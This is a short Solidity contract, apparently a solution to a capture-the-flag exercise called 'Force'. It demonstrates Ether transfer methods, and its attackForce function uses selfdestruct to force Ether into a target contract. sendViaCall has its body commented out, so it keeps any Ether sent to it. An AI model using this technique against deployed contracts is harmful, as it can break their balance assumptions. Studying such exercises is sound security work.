// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;


contract SendEther {
    function sendViaTransfer(address payable _to) public payable {
        // This function is no longer recommended for sending Ether.
        _to.transfer(msg.value);
    }

    function sendViaSend(address payable _to) public payable {
        // Send returns a boolean value indicating success or failure.
        // This function is not recommended for sending Ether.
        bool sent = _to.send(msg.value);
        require(sent, "Failed to send Ether");
    }

    function sendViaCall(address payable _to) public payable {

        // // Force.sol does not have payable function, nor receive/fallback(); thus, even converting contract address to payable won't work.
        address payable newAddress = payable(_to);
        // (bool sent, bytes memory data) = newAddress.call{value: msg.value}("");
        // newAddress.transfer(msg.value);
        // require(sent, "Failed to send Ether");
        // return sent;
    }

    function attackForce(address _to) public payable {
      selfdestruct( payable(_to) );
    }

    // fallback function; will accept any ETH sent to it.
    fallback() external payable {}


}


